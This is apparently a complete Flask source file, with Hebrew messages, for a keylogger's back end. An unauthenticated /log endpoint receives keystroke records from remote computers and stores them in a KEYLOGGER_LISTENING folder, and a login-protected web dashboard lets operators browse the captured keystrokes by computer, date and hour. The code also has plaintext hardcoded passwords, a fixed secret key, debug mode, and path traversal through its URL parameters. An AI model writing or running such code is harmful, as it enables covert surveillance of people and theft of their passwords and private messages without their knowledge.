from flask import Flask, request, render_template, redirect, url_for, session
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user
from pathlib import Path
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = "supersecretkey"

login_manager = LoginManager()
login_manager.init_app(app)

class User(UserMixin):
    def __init__(self, id, role):
        self.id = id
        self.role = role

users = {
    "admin": {"password": "1234", "role": "admin", "permissions": None},
    "user1": {"password": "abcd", "role": "user", "permissions": {
        "COMPUTER1": ["2025-09-03"]
    }},
}

@login_manager.user_loader
def load_user(user_id):
    if user_id in users:
        return User(user_id, users[user_id]["role"])
    return None

LOGS_DIR = Path.home() / "Desktop" / "KEYLOGGER_LISTENING"

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username in users and users[username]["password"] == password:
            user = User(username, users[username]["role"])
            login_user(user)
            return redirect(url_for("dashboard"))
        else:
            return "שם משתמש או סיסמה לא נכונים"
    return render_template("login.html")

@app.route("/dashboard")
@login_required
def dashboard():
    current_user = users[session["_user_id"]]
    if current_user["role"] == "admin":
        computers = [f.name for f in LOGS_DIR.iterdir() if f.is_dir()]
    else:
        computers = list(current_user["permissions"].keys())
    return render_template("dashboard.html", computers=computers, role=current_user["role"])

@app.route("/dates/<computer>")
@login_required
def dates(computer):
    current_user = users[session["_user_id"]]
    if current_user["role"] == "admin":
        dates = [f.name for f in (LOGS_DIR / computer).iterdir() if f.is_dir()]
    else:
        dates = current_user["permissions"].get(computer, [])
    return render_template("dates.html", computer=computer, dates=dates)

@app.route("/hours/<computer>/<date>")
@login_required
def hours(computer, date):
    hours_dir = LOGS_DIR / computer / date
    hours = [f.stem for f in hours_dir.iterdir() if f.is_file()]
    return render_template("hours.html", computer=computer, date=date, hours=hours)

@app.route("/view/<computer>/<date>/<hour>")
@login_required
def view_log(computer, date, hour):
    log_file = LOGS_DIR / computer / date / f"{hour}.txt"
    if not log_file.exists():
        return "לא נמצאו לוגים"
    with open(log_file, "r", encoding="utf-8") as f:
        content = f.read()
    return render_template("view_log.html", computer=computer, date=date, hour=hour, content=content.splitlines())

@app.route("/logout")
@login_required
def logout():
    logout_user()
    return redirect(url_for("login"))

@app.route("/log", methods=["POST"])
def receive_log():
    log_text = request.form.get("log")
    if log_text:
        try:
            parts = log_text.split(" | ", 2)
            timestamp_str, computer_name, message = parts
            timestamp = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")

            computer_dir = LOGS_DIR / computer_name
            date_dir = computer_dir / timestamp.strftime("%Y-%m-%d")
            os.makedirs(date_dir, exist_ok=True)

            file_path = date_dir / f"{timestamp.strftime('%H')}.txt"
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(message + "\n")
        except Exception as e:
            print(f"⚠️ שגיאה בשרת בעת שמירת לוג: {e}")
    return "OK", 200

if __name__ == "__main__":
    app.run(debug=True, port=8000)
